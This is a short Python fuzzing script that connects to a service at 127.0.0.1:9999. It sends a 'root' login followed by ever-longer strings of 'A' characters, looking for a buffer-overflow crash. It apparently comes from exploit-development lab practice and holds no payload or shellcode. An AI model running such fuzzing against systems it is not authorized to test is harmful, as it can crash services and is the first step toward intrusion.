import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

buffer = [b"A"]
counter = 100

while len(buffer) <= 50:
    buffer.append(b"A" * counter)
    counter = counter + 109

for string in buffer:
    print("Fuzzing ... %s bytes" % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.recv(1024)
    
    s.send(b'root\r\n')
    s.recv(1024)
    s.send(string + b'\r\n')
    s.send(b'QUIT\r\n')
    
    s.close()

